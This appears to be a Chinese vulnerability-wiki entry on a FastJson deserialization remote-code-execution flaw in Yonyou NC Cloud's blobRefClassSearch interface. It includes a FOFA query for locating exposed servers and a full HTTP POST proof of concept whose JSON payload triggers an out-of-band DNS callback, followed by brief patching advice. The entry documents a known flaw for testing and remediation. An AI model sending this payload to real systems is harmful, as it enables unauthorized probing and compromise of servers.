---
fofa: "app="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 用友NC Cloud blobRefClassSearch FastJson反序列化RCE漏洞

# 漏洞描述

用友 NC Cloud blobRefClassSearch 接口处存在FastJson反序列化漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

影响范围

用友-NC-Cloud

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="用友-NC-Cloud"

POC/EXP：

POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/json

{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"xxxhld.eyes.sh\"}}}"}

![image-20240714160237055](./.resource/用友NCCloudblobRefClassSearchFastJson反序列化RCE漏洞/media/image-20240714160237055.png)


![image-20240714160318905](./.resource/用友NCCloudblobRefClassSearchFastJson反序列化RCE漏洞/media/image-20240714160318905.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

厂商已发布了漏洞修复程序，请及时关注更新：

http://www.yonyougz.com/yonyou/yonyou-nc/


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
